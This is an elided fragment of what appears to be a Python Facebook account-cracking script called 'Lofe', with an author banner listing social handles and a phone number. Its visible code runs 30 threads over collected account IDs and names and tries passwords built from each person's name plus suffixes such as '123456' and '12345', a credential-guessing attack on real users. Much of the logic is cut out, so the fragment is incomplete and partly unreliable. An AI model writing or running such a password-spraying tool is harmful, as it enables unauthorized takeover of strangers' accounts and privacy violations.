...
f"""{Hj}
 ...
 - instagram   : Alzwage_xyz
 - facebook    : facebook.com/ahmedAlzwage.02
 - fanspage    : facebook.com/ahmedalzwage.03
 - whatsap     : +218921762445
 - github      : github.com/Libya.Pro
 - script name : Lofe
 - version     : 1.3
 - update pada : 2022
...
author = 'ahmed Alzwage '
fb_me = 'facebook.com/ahmedAlzwage.02'
github = 'github.com/libya.pro'
		...
		if unikers in ('Y', 'y'):
			...
			while True:
				...
				if pwx == '':
					...
					print ('%s• %s01%s methode %sapi %s(fast) '%(U,P,O,M,O))
			...
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						...
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+"123456", na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+"123456", na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+"123456", na[0]+"123", na[0]+"12345"]
			...
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						ss = name.split(' ')
						pwx = [ name, ss[0]+"123456", ss[0]+"123", ss[0]+"12345", ss[0]+"1234"]
